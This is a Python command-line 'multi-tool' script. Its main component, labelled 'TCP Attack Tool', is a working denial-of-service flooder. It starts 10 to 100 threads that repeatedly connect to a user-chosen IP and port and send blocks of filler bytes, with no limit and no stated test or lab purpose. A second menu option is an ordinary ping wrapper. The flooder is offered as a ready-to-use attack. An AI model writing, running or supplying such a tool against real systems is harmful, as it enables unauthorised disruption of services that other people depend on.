import socket
import threading
import subprocess
import platform
import time

def attack(target_ip, target_port, packet_size):
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(2)
            s.connect((target_ip, target_port))
            s.send(b"A" * packet_size)
            s.close()
        except Exception:
            pass

def run_attack():
    target_ip = input("Enter Target IP: ")
    target_port = int(input("Enter Target Port: "))

    print("\nSelect number of threads:")
    print("1. 10")
    print("2. 50")
    print("3. 100")
    thread_choice = input("Enter choice (1-3): ")
    thread_options = {"1": 10, "2": 50, "3": 100}
    num_threads = thread_options.get(thread_choice, 50)

    print("\nSelect packet size (bytes):")
    print("1. 512")
    print("2. 1024")
    print("3. 2048")
    size_choice = input("Enter choice (1-3): ")
    size_options = {"1": 512, "2": 1024, "3": 2048}
    packet_size = size_options.get(size_choice, 1024)

    print(f"\nStarting attack on {target_ip}:{target_port} with {num_threads} threads sending {packet_size} bytes each...")

    for _ in range(num_threads):
        thread = threading.Thread(target=attack, args=(target_ip, target_port, packet_size))
        thread.daemon = True
        thread.start()

    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\nAttack stopped by user")

def ping_host():
    target_ip = input("Enter IP or hostname to ping: ")
    # Determine the ping command based on the platform
    param = '-n' if platform.system().lower() == 'windows' else '-c'
    count = '4'  # number of packets

    print(f"Pinging {target_ip} with {count} packets...")

    try:
        # Run the ping command
        output = subprocess.check_output(['ping', param, count, target_ip], universal_newlines=True)
        print(output)
    except subprocess.CalledProcessError as e:
        print(f"Failed to ping {target_ip}. Error: {e}")

def main_menu():
    while True:
        print("\n=== Multi-tool Menu ===")
        print("1. TCP Attack Tool")
        print("2. Ping Tool")
        print("3. Exit")
        choice = input("Select tool (1-3): ")

        if choice == '1':
            run_attack()
        elif choice == '2':
            ping_host()
        elif choice == '3':
            print("Exiting multi-tool. Goodbye!")
            break
        else:
            print("Invalid choice. Please try again.")

if __name__ == "__main__":
    main_menu()